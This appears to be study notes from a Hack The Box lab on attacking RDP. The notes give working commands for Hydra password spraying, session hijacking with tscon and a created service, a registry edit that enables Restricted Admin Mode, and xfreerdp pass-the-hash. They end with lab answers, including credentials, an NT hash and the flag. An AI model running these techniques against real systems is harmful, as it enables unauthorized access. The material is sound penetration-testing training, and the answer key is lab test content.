# Attacking RDP
## Enumeration

```sh
masterofblafu@htb[/htb]$ nmap -Pn -p3389 192.168.2.143 
```

## Misconfigurations
Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.

**Hydra - RDP Password Spraying:** the password password123 will be tested against a list of usernames in the usernames.txt file. 

```sh
masterofblafu@htb[/htb]$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

**RDP Login**

```sh
masterofblafu@htb[/htb]$ rdesktop -u admin -p password123 192.168.2.143
```

## Protocol Specific Attacks
### RDP Session Hijacking
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which SESSION ID we would like to connect to which session name (which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

```cmd
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
  
If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the binpath, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```cmd
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

To run the command, we can start the sessionhijack service :

```cmd
C:\htb> net start sessionhijack
```

Once the service is started, a new terminal with the user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.

> **Note:** This method no longer works on Server 2019.

### RDP Pass-the-Hash (PtH)
We may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

This attack requires `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host. This can be enabled by adding a new registry key: 

```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
``` 

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: 
```
masterofblafu@htb[/htb]$ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.


## Questions
1. What is the name of the file that was left on the Desktop? (Format example: filename.txt) **Answer: pentest-notes.txt**
   - `$ $ rdesktop -u htb-rdp -p HTBRocks! 10.129.32.120` → RDP to the target machine using the provided credential `htb-rdp:HTBRocks!` and find the file on the Desktop.
2. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? **Answer: DisableRestrictedAdmin**
   - Explained in RDP Pass-the-Hash (PtH)
3. Connect via RDP with the Administrator account and submit the flag.txt as you answer. **Answer: HTB{RDP_P4$$_Th3_H4$#}**
   - From the existing RDP session, read the `pentest-notes.txt` to obtain the Administrator hash (`0E14B9D6330BF16C30B1924111104824`) and enable `Restricted Admin Mode` by using this command:
      ```
      C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
      ```
   - `$ xfreerdp /v:10.129.32.120 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824` → RDP to the target machine with Administrator account using the RDP PtH technique and read the flag